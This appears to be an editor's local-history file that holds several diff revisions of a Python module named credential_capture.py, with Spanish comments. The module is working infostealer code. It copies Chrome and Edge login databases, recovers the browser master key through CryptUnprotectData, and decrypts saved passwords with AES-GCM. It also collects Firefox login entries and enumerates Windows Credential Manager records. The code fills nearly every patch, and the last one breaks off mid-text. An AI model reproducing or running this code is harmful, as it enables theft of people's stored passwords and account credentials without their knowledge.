{
    "sourceFile": "src/modules/credential_capture.py",
    "activeCommit": 0,
    "commits": [
        {
            "activePatchIndex": 6,
            "patches": [
                {
                    "date": 1740263570777,
                    "content": "Index: \n===================================================================\n--- \n+++ \n"
                },
                {
                    "date": 1740263676411,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,318 @@\n+\"\"\"\r\n+Módulo de captura de credenciales.\r\n+Permite extraer credenciales de procesos y navegadores web.\r\n+\"\"\"\r\n+\r\n+import os\r\n+import json\r\n+import base64\r\n+import sqlite3\r\n+import shutil\r\n+import platform\r\n+import logging\r\n+import subprocess\r\n+from typing import List, Dict, Optional, Union\r\n+import tempfile\r\n+try:\r\n+    import win32crypt\r\n+    from Cryptodome.Cipher import AES\r\n+    WINDOWS_SUPPORT = True\r\n+except ImportError:\r\n+    WINDOWS_SUPPORT = False\r\n+import ctypes\r\n+import ctypes.wintypes\r\n+\r\n+class CredentialCapture:\r\n+    def __init__(self):\r\n+        \"\"\"Inicializa el capturador de credenciales.\"\"\"\r\n+        self.system = platform.system().lower()\r\n+        if self.system == \"windows\" and not WINDOWS_SUPPORT:\r\n+            logging.warning(\"Módulos de Windows no disponibles. La captura de credenciales estará limitada.\")\r\n+        self.temp_dir = tempfile.mkdtemp()\r\n+        self.results: Dict[str, List[Dict[str, str]]] = {\r\n+            \"chrome\": [],\r\n+            \"firefox\": [],\r\n+            \"edge\": [],\r\n+            \"system\": []\r\n+        }\r\n+\r\n+    def capture_chrome_passwords(self) -> List[Dict[str, str]]:\r\n+        \"\"\"\r\n+        Captura credenciales almacenadas en Chrome.\r\n+        \r\n+        Returns:\r\n+            Lista de credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            if self.system != \"windows\":\r\n+                return []\r\n+                \r\n+            local_state_path = os.path.join(\r\n+                os.environ[\"USERPROFILE\"],\r\n+                \"AppData\", \"Local\", \"Google\", \"Chrome\",\r\n+                \"User Data\", \"Local State\"\r\n+            )\r\n+            \r\n+            login_db_path = os.path.join(\r\n+                os.environ[\"USERPROFILE\"],\r\n+                \"AppData\", \"Local\", \"Google\", \"Chrome\",\r\n+                \"User Data\", \"Default\", \"Login Data\"\r\n+            )\r\n+            \r\n+            # Copiar base de datos a temporal\r\n+            temp_db = os.path.join(self.temp_dir, \"chrome_login.db\")\r\n+            shutil.copy2(login_db_path, temp_db)\r\n+            \r\n+            # Obtener clave de cifrado\r\n+            with open(local_state_path, \"r\", encoding=\"utf-8\") as f:\r\n+                local_state = json.loads(f.read())\r\n+                \r\n+            key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\r\n+            key = win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]\r\n+            \r\n+            # Leer credenciales\r\n+            credentials = []\r\n+            with sqlite3.connect(temp_db) as conn:\r\n+                cursor = conn.cursor()\r\n+                cursor.execute(\r\n+                    \"SELECT origin_url, username_value, password_value FROM logins\"\r\n+                )\r\n+                \r\n+                for url, username, encrypted_pass in cursor.fetchall():\r\n+                    try:\r\n+                        # Descifrar contraseña\r\n+                        iv = encrypted_pass[3:15]\r\n+                        payload = encrypted_pass[15:]\r\n+                        cipher = AES.new(key, AES.MODE_GCM, iv)\r\n+                        decrypted_pass = cipher.decrypt(payload)[:-16].decode()\r\n+                        \r\n+                        credentials.append({\r\n+                            \"url\": url,\r\n+                            \"username\": username,\r\n+                            \"password\": decrypted_pass\r\n+                        })\r\n+                    except Exception as e:\r\n+                        logging.debug(f\"Error descifrando credencial: {e}\")\r\n+                        continue\r\n+                        \r\n+            return credentials\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error capturando credenciales de Chrome: {e}\")\r\n+            return []\r\n+        finally:\r\n+            try:\r\n+                os.remove(temp_db)\r\n+            except:\r\n+                pass\r\n+\r\n+    def capture_firefox_passwords(self) -> List[Dict[str, str]]:\r\n+        \"\"\"\r\n+        Captura credenciales almacenadas en Firefox.\r\n+        \r\n+        Returns:\r\n+            Lista de credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            if self.system != \"windows\":\r\n+                return []\r\n+                \r\n+            profiles_path = os.path.join(\r\n+                os.environ[\"APPDATA\"],\r\n+                \"Mozilla\", \"Firefox\", \"Profiles\"\r\n+            )\r\n+            \r\n+            credentials = []\r\n+            for profile in os.listdir(profiles_path):\r\n+                db_path = os.path.join(profiles_path, profile, \"logins.json\")\r\n+                if not os.path.exists(db_path):\r\n+                    continue\r\n+                    \r\n+                # Copiar archivo a temporal\r\n+                temp_json = os.path.join(self.temp_dir, \"firefox_logins.json\")\r\n+                shutil.copy2(db_path, temp_json)\r\n+                \r\n+                try:\r\n+                    with open(temp_json, \"r\", encoding=\"utf-8\") as f:\r\n+                        logins = json.load(f)\r\n+                        \r\n+                    for login in logins.get(\"logins\", []):\r\n+                        try:\r\n+                            credentials.append({\r\n+                                \"url\": login.get(\"hostname\", \"\"),\r\n+                                \"username\": login.get(\"encryptedUsername\", \"\"),\r\n+                                \"password\": login.get(\"encryptedPassword\", \"\")\r\n+                            })\r\n+                        except:\r\n+                            continue\r\n+                            \r\n+                except Exception as e:\r\n+                    logging.debug(f\"Error leyendo perfil Firefox: {e}\")\r\n+                    continue\r\n+                finally:\r\n+                    try:\r\n+                        os.remove(temp_json)\r\n+                    except:\r\n+                        pass\r\n+                        \r\n+            return credentials\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error capturando credenciales de Firefox: {e}\")\r\n+            return []\r\n+\r\n+    def capture_edge_passwords(self) -> List[Dict[str, str]]:\r\n+        \"\"\"\r\n+        Captura credenciales almacenadas en Edge.\r\n+        \r\n+        Returns:\r\n+            Lista de credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            if self.system != \"windows\":\r\n+                return []\r\n+                \r\n+            local_state_path = os.path.join(\r\n+                os.environ[\"LOCALAPPDATA\"],\r\n+                \"Microsoft\", \"Edge\", \"User Data\", \"Local State\"\r\n+            )\r\n+            \r\n+            login_db_path = os.path.join(\r\n+                os.environ[\"LOCALAPPDATA\"],\r\n+                \"Microsoft\", \"Edge\", \"User Data\", \"Default\", \"Login Data\"\r\n+            )\r\n+            \r\n+            # El resto del proceso es similar a Chrome\r\n+            temp_db = os.path.join(self.temp_dir, \"edge_login.db\")\r\n+            shutil.copy2(login_db_path, temp_db)\r\n+            \r\n+            with open(local_state_path, \"r\", encoding=\"utf-8\") as f:\r\n+                local_state = json.loads(f.read())\r\n+                \r\n+            key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\r\n+            key = win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]\r\n+            \r\n+            credentials = []\r\n+            with sqlite3.connect(temp_db) as conn:\r\n+                cursor = conn.cursor()\r\n+                cursor.execute(\r\n+                    \"SELECT origin_url, username_value, password_value FROM logins\"\r\n+                )\r\n+                \r\n+                for url, username, encrypted_pass in cursor.fetchall():\r\n+                    try:\r\n+                        iv = encrypted_pass[3:15]\r\n+                        payload = encrypted_pass[15:]\r\n+                        cipher = AES.new(key, AES.MODE_GCM, iv)\r\n+                        decrypted_pass = cipher.decrypt(payload)[:-16].decode()\r\n+                        \r\n+                        credentials.append({\r\n+                            \"url\": url,\r\n+                            \"username\": username,\r\n+                            \"password\": decrypted_pass\r\n+                        })\r\n+                    except:\r\n+                        continue\r\n+                        \r\n+            return credentials\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error capturando credenciales de Edge: {e}\")\r\n+            return []\r\n+        finally:\r\n+            try:\r\n+                os.remove(temp_db)\r\n+            except:\r\n+                pass\r\n+\r\n+    def capture_system_credentials(self) -> List[Dict[str, str]]:\r\n+        \"\"\"\r\n+        Captura credenciales almacenadas en el sistema.\r\n+        \r\n+        Returns:\r\n+            Lista de credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            if self.system != \"windows\":\r\n+                return []\r\n+\r\n+            CRED_TYPE_GENERIC = 1\r\n+            CRED_TYPE_DOMAIN_PASSWORD = 2\r\n+            CRED_TYPE_DOMAIN_CERTIFICATE = 3\r\n+            CRED_TYPE_DOMAIN_VISIBLE_PASSWORD = 4\r\n+\r\n+            CredEnumerate = ctypes.windll.advapi32.CredEnumerateW\r\n+            CredFree = ctypes.windll.advapi32.CredFree\r\n+\r\n+            class CREDENTIAL_ATTRIBUTE(ctypes.Structure):\r\n+                _fields_ = [\r\n+                    ('Keyword', ctypes.wintypes.LPWSTR),\r\n+                    ('Flags', ctypes.wintypes.DWORD),\r\n+                    ('ValueSize', ctypes.wintypes.DWORD),\r\n+                    ('Value', ctypes.wintypes.LPBYTE)\r\n+                ]\r\n+\r\n+            class CREDENTIAL(ctypes.Structure):\r\n+                _fields_ = [\r\n+                    ('Flags', ctypes.wintypes.DWORD),\r\n+                    ('Type', ctypes.wintypes.DWORD),\r\n+                    ('TargetName', ctypes.wintypes.LPWSTR),\r\n+                    ('Comment', ctypes.wintypes.LPWSTR),\r\n+                    ('LastWritten', ctypes.wintypes.FILETIME),\r\n+                    ('CredentialBlobSize', ctypes.wintypes.DWORD),\r\n+                    ('CredentialBlob', ctypes.wintypes.LPBYTE),\r\n+                    ('Persist', ctypes.wintypes.DWORD),\r\n+                    ('AttributeCount', ctypes.wintypes.DWORD),\r\n+                    ('Attributes', ctypes.POINTER(CREDENTIAL_ATTRIBUTE)),\r\n+                    ('TargetAlias', ctypes.wintypes.LPWSTR),\r\n+                    ('UserName', ctypes.wintypes.LPWSTR)\r\n+                ]\r\n+\r\n+            count = ctypes.wintypes.DWORD()\r\n+            creds = ctypes.POINTER(ctypes.POINTER(CREDENTIAL))()\r\n+\r\n+            credentials = []\r\n+            if CredEnumerate(None, 0, ctypes.byref(count), ctypes.byref(creds)):\r\n+                for i in range(count.value):\r\n+                    cred = creds[i].contents\r\n+                    if cred.Type in [CRED_TYPE_GENERIC, CRED_TYPE_DOMAIN_PASSWORD]:\r\n+                        try:\r\n+                            credentials.append({\r\n+                                \"target\": cred.TargetName,\r\n+                                \"username\": cred.UserName,\r\n+                                \"type\": \"Generic\" if cred.Type == CRED_TYPE_GENERIC else \"Domain\",\r\n+                                \"blob_size\": cred.CredentialBlobSize\r\n+                            })\r\n+                        except:\r\n+                            continue\r\n+\r\n+                CredFree(creds)\r\n+                \r\n+            return credentials\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error capturando credenciales del sistema: {e}\")\r\n+            return []\r\n+\r\n+    def capture_all(self) -> Dict[str, List[Dict[str, str]]]:\r\n+        \"\"\"\r\n+        Captura todas las credenciales disponibles.\r\n+        \r\n+        Returns:\r\n+            Dict con todas las credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            self.results[\"chrome\"] = self.capture_chrome_passwords()\r\n+            self.results[\"firefox\"] = self.capture_firefox_passwords()\r\n+            self.results[\"edge\"] = self.capture_edge_passwords()\r\n+            self.results[\"system\"] = self.capture_system_credentials()\r\n+            return self.results\r\n+        finally:\r\n+            self.cleanup()\r\n+\r\n+    def cleanup(self):\r\n+        \"\"\"Limpia archivos temporales.\"\"\"\r\n+        try:\r\n+            shutil.rmtree(self.temp_dir)\r\n+        except:\r\n+            pass\r\n"
                },
                {
                    "date": 1740263693553,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,318 @@\n+\"\"\"\r\n+Módulo de captura de credenciales.\r\n+Permite extraer credenciales de procesos y navegadores web.\r\n+\"\"\"\r\n+\r\n+import os\r\n+import json\r\n+import base64\r\n+import sqlite3\r\n+import shutil\r\n+import platform\r\n+import logging\r\n+import subprocess\r\n+from typing import List, Dict, Optional, Union\r\n+import tempfile\r\n+try:\r\n+    import win32crypt\r\n+    from Cryptodome.Cipher import AES\r\n+    WINDOWS_SUPPORT = True\r\n+except ImportError:\r\n+    WINDOWS_SUPPORT = False\r\n+import ctypes\r\n+import ctypes.wintypes\r\n+\r\n+class CredentialCapture:\r\n+    def __init__(self):\r\n+        \"\"\"Inicializa el capturador de credenciales.\"\"\"\r\n+        self.system = platform.system().lower()\r\n+        if self.system == \"windows\" and not WINDOWS_SUPPORT:\r\n+            logging.warning(\"Módulos de Windows no disponibles. La captura de credenciales estará limitada.\")\r\n+        self.temp_dir = tempfile.mkdtemp()\r\n+        self.results: Dict[str, List[Dict[str, str]]] = {\r\n+            \"chrome\": [],\r\n+            \"firefox\": [],\r\n+            \"edge\": [],\r\n+            \"system\": []\r\n+        }\r\n+\r\n+    def capture_chrome_passwords(self) -> List[Dict[str, str]]:\r\n+        \"\"\"\r\n+        Captura credenciales almacenadas en Chrome.\r\n+        \r\n+        Returns:\r\n+            Lista de credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            if self.system != \"windows\":\r\n+                return []\r\n+                \r\n+            local_state_path = os.path.join(\r\n+                os.environ[\"USERPROFILE\"],\r\n+                \"AppData\", \"Local\", \"Google\", \"Chrome\",\r\n+                \"User Data\", \"Local State\"\r\n+            )\r\n+            \r\n+            login_db_path = os.path.join(\r\n+                os.environ[\"USERPROFILE\"],\r\n+                \"AppData\", \"Local\", \"Google\", \"Chrome\",\r\n+                \"User Data\", \"Default\", \"Login Data\"\r\n+            )\r\n+            \r\n+            # Copiar base de datos a temporal\r\n+            temp_db = os.path.join(self.temp_dir, \"chrome_login.db\")\r\n+            shutil.copy2(login_db_path, temp_db)\r\n+            \r\n+            # Obtener clave de cifrado\r\n+            with open(local_state_path, \"r\", encoding=\"utf-8\") as f:\r\n+                local_state = json.loads(f.read())\r\n+                \r\n+            key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\r\n+            key = win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]\r\n+            \r\n+            # Leer credenciales\r\n+            credentials = []\r\n+            with sqlite3.connect(temp_db) as conn:\r\n+                cursor = conn.cursor()\r\n+                cursor.execute(\r\n+                    \"SELECT origin_url, username_value, password_value FROM logins\"\r\n+                )\r\n+                \r\n+                for url, username, encrypted_pass in cursor.fetchall():\r\n+                    try:\r\n+                        # Descifrar contraseña\r\n+                        iv = encrypted_pass[3:15]\r\n+                        payload = encrypted_pass[15:]\r\n+                        cipher = AES.new(key, AES.MODE_GCM, iv)\r\n+                        decrypted_pass = cipher.decrypt(payload)[:-16].decode()\r\n+                        \r\n+                        credentials.append({\r\n+                            \"url\": url,\r\n+                            \"username\": username,\r\n+                            \"password\": decrypted_pass\r\n+                        })\r\n+                    except Exception as e:\r\n+                        logging.debug(f\"Error descifrando credencial: {e}\")\r\n+                        continue\r\n+                        \r\n+            return credentials\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error capturando credenciales de Chrome: {e}\")\r\n+            return []\r\n+        finally:\r\n+            try:\r\n+                os.remove(temp_db)\r\n+            except:\r\n+                pass\r\n+\r\n+    def capture_firefox_passwords(self) -> List[Dict[str, str]]:\r\n+        \"\"\"\r\n+        Captura credenciales almacenadas en Firefox.\r\n+        \r\n+        Returns:\r\n+            Lista de credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            if self.system != \"windows\":\r\n+                return []\r\n+                \r\n+            profiles_path = os.path.join(\r\n+                os.environ[\"APPDATA\"],\r\n+                \"Mozilla\", \"Firefox\", \"Profiles\"\r\n+            )\r\n+            \r\n+            credentials = []\r\n+            for profile in os.listdir(profiles_path):\r\n+                db_path = os.path.join(profiles_path, profile, \"logins.json\")\r\n+                if not os.path.exists(db_path):\r\n+                    continue\r\n+                    \r\n+                # Copiar archivo a temporal\r\n+                temp_json = os.path.join(self.temp_dir, \"firefox_logins.json\")\r\n+                shutil.copy2(db_path, temp_json)\r\n+                \r\n+                try:\r\n+                    with open(temp_json, \"r\", encoding=\"utf-8\") as f:\r\n+                        logins = json.load(f)\r\n+                        \r\n+                    for login in logins.get(\"logins\", []):\r\n+                        try:\r\n+                            credentials.append({\r\n+                                \"url\": login.get(\"hostname\", \"\"),\r\n+                                \"username\": login.get(\"encryptedUsername\", \"\"),\r\n+                                \"password\": login.get(\"encryptedPassword\", \"\")\r\n+                            })\r\n+                        except:\r\n+                            continue\r\n+                            \r\n+                except Exception as e:\r\n+                    logging.debug(f\"Error leyendo perfil Firefox: {e}\")\r\n+                    continue\r\n+                finally:\r\n+                    try:\r\n+                        os.remove(temp_json)\r\n+                    except:\r\n+                        pass\r\n+                        \r\n+            return credentials\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error capturando credenciales de Firefox: {e}\")\r\n+            return []\r\n+\r\n+    def capture_edge_passwords(self) -> List[Dict[str, str]]:\r\n+        \"\"\"\r\n+        Captura credenciales almacenadas en Edge.\r\n+        \r\n+        Returns:\r\n+            Lista de credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            if self.system != \"windows\":\r\n+                return []\r\n+                \r\n+            local_state_path = os.path.join(\r\n+                os.environ[\"LOCALAPPDATA\"],\r\n+                \"Microsoft\", \"Edge\", \"User Data\", \"Local State\"\r\n+            )\r\n+            \r\n+            login_db_path = os.path.join(\r\n+                os.environ[\"LOCALAPPDATA\"],\r\n+                \"Microsoft\", \"Edge\", \"User Data\", \"Default\", \"Login Data\"\r\n+            )\r\n+            \r\n+            # El resto del proceso es similar a Chrome\r\n+            temp_db = os.path.join(self.temp_dir, \"edge_login.db\")\r\n+            shutil.copy2(login_db_path, temp_db)\r\n+            \r\n+            with open(local_state_path, \"r\", encoding=\"utf-8\") as f:\r\n+                local_state = json.loads(f.read())\r\n+                \r\n+            key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\r\n+            key = win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]\r\n+            \r\n+            credentials = []\r\n+            with sqlite3.connect(temp_db) as conn:\r\n+                cursor = conn.cursor()\r\n+                cursor.execute(\r\n+                    \"SELECT origin_url, username_value, password_value FROM logins\"\r\n+                )\r\n+                \r\n+                for url, username, encrypted_pass in cursor.fetchall():\r\n+                    try:\r\n+                        iv = encrypted_pass[3:15]\r\n+                        payload = encrypted_pass[15:]\r\n+                        cipher = AES.new(key, AES.MODE_GCM, iv)\r\n+                        decrypted_pass = cipher.decrypt(payload)[:-16].decode()\r\n+                        \r\n+                        credentials.append({\r\n+                            \"url\": url,\r\n+                            \"username\": username,\r\n+                            \"password\": decrypted_pass\r\n+                        })\r\n+                    except:\r\n+                        continue\r\n+                        \r\n+            return credentials\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error capturando credenciales de Edge: {e}\")\r\n+            return []\r\n+        finally:\r\n+            try:\r\n+                os.remove(temp_db)\r\n+            except:\r\n+                pass\r\n+\r\n+    def capture_system_credentials(self) -> List[Dict[str, str]]:\r\n+        \"\"\"\r\n+        Captura credenciales almacenadas en el sistema.\r\n+        \r\n+        Returns:\r\n+            Lista de credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            if self.system != \"windows\":\r\n+                return []\r\n+\r\n+            CRED_TYPE_GENERIC = 1\r\n+            CRED_TYPE_DOMAIN_PASSWORD = 2\r\n+            CRED_TYPE_DOMAIN_CERTIFICATE = 3\r\n+            CRED_TYPE_DOMAIN_VISIBLE_PASSWORD = 4\r\n+\r\n+            CredEnumerate = ctypes.windll.advapi32.CredEnumerateW\r\n+            CredFree = ctypes.windll.advapi32.CredFree\r\n+\r\n+            class CREDENTIAL_ATTRIBUTE(ctypes.Structure):\r\n+                _fields_ = [\r\n+                    ('Keyword', ctypes.wintypes.LPWSTR),\r\n+                    ('Flags', ctypes.wintypes.DWORD),\r\n+                    ('ValueSize', ctypes.wintypes.DWORD),\r\n+                    ('Value', ctypes.wintypes.LPBYTE)\r\n+                ]\r\n+\r\n+            class CREDENTIAL(ctypes.Structure):\r\n+                _fields_ = [\r\n+                    ('Flags', ctypes.wintypes.DWORD),\r\n+                    ('Type', ctypes.wintypes.DWORD),\r\n+                    ('TargetName', ctypes.wintypes.LPWSTR),\r\n+                    ('Comment', ctypes.wintypes.LPWSTR),\r\n+                    ('LastWritten', ctypes.wintypes.FILETIME),\r\n+                    ('CredentialBlobSize', ctypes.wintypes.DWORD),\r\n+                    ('CredentialBlob', ctypes.wintypes.LPBYTE),\r\n+                    ('Persist', ctypes.wintypes.DWORD),\r\n+                    ('AttributeCount', ctypes.wintypes.DWORD),\r\n+                    ('Attributes', ctypes.POINTER(CREDENTIAL_ATTRIBUTE)),\r\n+                    ('TargetAlias', ctypes.wintypes.LPWSTR),\r\n+                    ('UserName', ctypes.wintypes.LPWSTR)\r\n+                ]\r\n+\r\n+            count = ctypes.wintypes.DWORD()\r\n+            creds = ctypes.POINTER(ctypes.POINTER(CREDENTIAL))()\r\n+\r\n+            credentials = []\r\n+            if CredEnumerate(None, 0, ctypes.byref(count), ctypes.byref(creds)):\r\n+                for i in range(count.value):\r\n+                    cred = creds[i].contents\r\n+                    if cred.Type in [CRED_TYPE_GENERIC, CRED_TYPE_DOMAIN_PASSWORD]:\r\n+                        try:\r\n+                            credentials.append({\r\n+                                \"target\": cred.TargetName,\r\n+                                \"username\": cred.UserName,\r\n+                                \"type\": \"Generic\" if cred.Type == CRED_TYPE_GENERIC else \"Domain\",\r\n+                                \"blob_size\": cred.CredentialBlobSize\r\n+                            })\r\n+                        except:\r\n+                            continue\r\n+\r\n+                CredFree(creds)\r\n+                \r\n+            return credentials\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error capturando credenciales del sistema: {e}\")\r\n+            return []\r\n+\r\n+    def capture_all(self) -> Dict[str, List[Dict[str, str]]]:\r\n+        \"\"\"\r\n+        Captura todas las credenciales disponibles.\r\n+        \r\n+        Returns:\r\n+            Dict con todas las credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            self.results[\"chrome\"] = self.capture_chrome_passwords()\r\n+            self.results[\"firefox\"] = self.capture_firefox_passwords()\r\n+            self.results[\"edge\"] = self.capture_edge_passwords()\r\n+            self.results[\"system\"] = self.capture_system_credentials()\r\n+            return self.results\r\n+        finally:\r\n+            self.cleanup()\r\n+\r\n+    def cleanup(self):\r\n+        \"\"\"Limpia archivos temporales.\"\"\"\r\n+        try:\r\n+            shutil.rmtree(self.temp_dir)\r\n+        except:\r\n+            pass\r\n"
                },
                {
                    "date": 1740263747314,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -13,13 +13,15 @@\n import subprocess\r\n from typing import List, Dict, Optional, Union\r\n import tempfile\r\n try:\r\n-    import win32crypt\r\n+    from win32crypt import CryptUnprotectData\r\n     from Cryptodome.Cipher import AES\r\n     WINDOWS_SUPPORT = True\r\n except ImportError:\r\n     WINDOWS_SUPPORT = False\r\n+    def CryptUnprotectData(*args, **kwargs):\r\n+        raise NotImplementedError(\"CryptUnprotectData no está disponible\")\r\n import ctypes\r\n import ctypes.wintypes\r\n \r\n class CredentialCapture:\r\n@@ -67,9 +69,9 @@\n             with open(local_state_path, \"r\", encoding=\"utf-8\") as f:\r\n                 local_state = json.loads(f.read())\r\n                 \r\n             key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\r\n-            key = win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]\r\n+            key = CryptUnprotectData(key[5:], None, None, None, 0)[1]\r\n             \r\n             # Leer credenciales\r\n             credentials = []\r\n             with sqlite3.connect(temp_db) as conn:\r\n@@ -189,10 +191,8 @@\n             with open(local_state_path, \"r\", encoding=\"utf-8\") as f:\r\n                 local_state = json.loads(f.read())\r\n                 \r\n             key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\r\n-            key = win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]\r\n-            \r\n             credentials = []\r\n             with sqlite3.connect(temp_db) as conn:\r\n                 cursor = conn.cursor()\r\n                 cursor.execute(\r\n"
                },
                {
                    "date": 1740263784537,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,320 @@\n+\"\"\"\r\n+Módulo de captura de credenciales.\r\n+Permite extraer credenciales de procesos y navegadores web.\r\n+\"\"\"\r\n+\r\n+import os\r\n+import json\r\n+import base64\r\n+import sqlite3\r\n+import shutil\r\n+import platform\r\n+import logging\r\n+import subprocess\r\n+from typing import List, Dict, Optional, Union\r\n+import tempfile\r\n+try:\r\n+    from win32crypt import CryptUnprotectData\r\n+    from Cryptodome.Cipher import AES\r\n+    WINDOWS_SUPPORT = True\r\n+except ImportError:\r\n+    WINDOWS_SUPPORT = False\r\n+    def CryptUnprotectData(*args, **kwargs):\r\n+        raise NotImplementedError(\"CryptUnprotectData no está disponible\")\r\n+import ctypes\r\n+import ctypes.wintypes\r\n+\r\n+class CredentialCapture:\r\n+    def __init__(self):\r\n+        \"\"\"Inicializa el capturador de credenciales.\"\"\"\r\n+        self.system = platform.system().lower()\r\n+        if self.system == \"windows\" and not WINDOWS_SUPPORT:\r\n+            logging.warning(\"Módulos de Windows no disponibles. La captura de credenciales estará limitada.\")\r\n+        self.temp_dir = tempfile.mkdtemp()\r\n+        self.results: Dict[str, List[Dict[str, str]]] = {\r\n+            \"chrome\": [],\r\n+            \"firefox\": [],\r\n+            \"edge\": [],\r\n+            \"system\": []\r\n+        }\r\n+\r\n+    def capture_chrome_passwords(self) -> List[Dict[str, str]]:\r\n+        \"\"\"\r\n+        Captura credenciales almacenadas en Chrome.\r\n+        \r\n+        Returns:\r\n+            Lista de credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            if self.system != \"windows\":\r\n+                return []\r\n+                \r\n+            local_state_path = os.path.join(\r\n+                os.environ[\"USERPROFILE\"],\r\n+                \"AppData\", \"Local\", \"Google\", \"Chrome\",\r\n+                \"User Data\", \"Local State\"\r\n+            )\r\n+            \r\n+            login_db_path = os.path.join(\r\n+                os.environ[\"USERPROFILE\"],\r\n+                \"AppData\", \"Local\", \"Google\", \"Chrome\",\r\n+                \"User Data\", \"Default\", \"Login Data\"\r\n+            )\r\n+            \r\n+            # Copiar base de datos a temporal\r\n+            temp_db = os.path.join(self.temp_dir, \"chrome_login.db\")\r\n+            shutil.copy2(login_db_path, temp_db)\r\n+            \r\n+            # Obtener clave de cifrado\r\n+            with open(local_state_path, \"r\", encoding=\"utf-8\") as f:\r\n+                local_state = json.loads(f.read())\r\n+                \r\n+            key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\r\n+            key = CryptUnprotectData(key[5:], None, None, None, 0)[1]\r\n+            \r\n+            # Leer credenciales\r\n+            credentials = []\r\n+            with sqlite3.connect(temp_db) as conn:\r\n+                cursor = conn.cursor()\r\n+                cursor.execute(\r\n+                    \"SELECT origin_url, username_value, password_value FROM logins\"\r\n+                )\r\n+                \r\n+                for url, username, encrypted_pass in cursor.fetchall():\r\n+                    try:\r\n+                        # Descifrar contraseña\r\n+                        iv = encrypted_pass[3:15]\r\n+                        payload = encrypted_pass[15:]\r\n+                        cipher = AES.new(key, AES.MODE_GCM, iv)\r\n+                        decrypted_pass = cipher.decrypt(payload)[:-16].decode()\r\n+                        \r\n+                        credentials.append({\r\n+                            \"url\": url,\r\n+                            \"username\": username,\r\n+                            \"password\": decrypted_pass\r\n+                        })\r\n+                    except Exception as e:\r\n+                        logging.debug(f\"Error descifrando credencial: {e}\")\r\n+                        continue\r\n+                        \r\n+            return credentials\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error capturando credenciales de Chrome: {e}\")\r\n+            return []\r\n+        finally:\r\n+            try:\r\n+                os.remove(temp_db)\r\n+            except:\r\n+                pass\r\n+\r\n+    def capture_firefox_passwords(self) -> List[Dict[str, str]]:\r\n+        \"\"\"\r\n+        Captura credenciales almacenadas en Firefox.\r\n+        \r\n+        Returns:\r\n+            Lista de credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            if self.system != \"windows\":\r\n+                return []\r\n+                \r\n+            profiles_path = os.path.join(\r\n+                os.environ[\"APPDATA\"],\r\n+                \"Mozilla\", \"Firefox\", \"Profiles\"\r\n+            )\r\n+            \r\n+            credentials = []\r\n+            for profile in os.listdir(profiles_path):\r\n+                db_path = os.path.join(profiles_path, profile, \"logins.json\")\r\n+                if not os.path.exists(db_path):\r\n+                    continue\r\n+                    \r\n+                # Copiar archivo a temporal\r\n+                temp_json = os.path.join(self.temp_dir, \"firefox_logins.json\")\r\n+                shutil.copy2(db_path, temp_json)\r\n+                \r\n+                try:\r\n+                    with open(temp_json, \"r\", encoding=\"utf-8\") as f:\r\n+                        logins = json.load(f)\r\n+                        \r\n+                    for login in logins.get(\"logins\", []):\r\n+                        try:\r\n+                            credentials.append({\r\n+                                \"url\": login.get(\"hostname\", \"\"),\r\n+                                \"username\": login.get(\"encryptedUsername\", \"\"),\r\n+                                \"password\": login.get(\"encryptedPassword\", \"\")\r\n+                            })\r\n+                        except:\r\n+                            continue\r\n+                            \r\n+                except Exception as e:\r\n+                    logging.debug(f\"Error leyendo perfil Firefox: {e}\")\r\n+                    continue\r\n+                finally:\r\n+                    try:\r\n+                        os.remove(temp_json)\r\n+                    except:\r\n+                        pass\r\n+                        \r\n+            return credentials\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error capturando credenciales de Firefox: {e}\")\r\n+            return []\r\n+\r\n+    def capture_edge_passwords(self) -> List[Dict[str, str]]:\r\n+        \"\"\"\r\n+        Captura credenciales almacenadas en Edge.\r\n+        \r\n+        Returns:\r\n+            Lista de credenciales encontradas\r\n+        \"\"\"\r\n+        try:\r\n+            if self.system != \"windows\":\r\n+                return []\r\n+                \r\n+            local_state_path = os.path.join(\r\n+                os.environ[\"LOCALAPPDATA\"],\r\n+                \"Microsoft\", \"Edge\", \"User Data\", \"Local State\"\r\n+            )\r\n+            \r\n+            login_db_path = os.path.join(\r\n+                os.environ[\"LOCALAPPDATA\"],\r\n+                \"Microsoft\", \"Edge\", 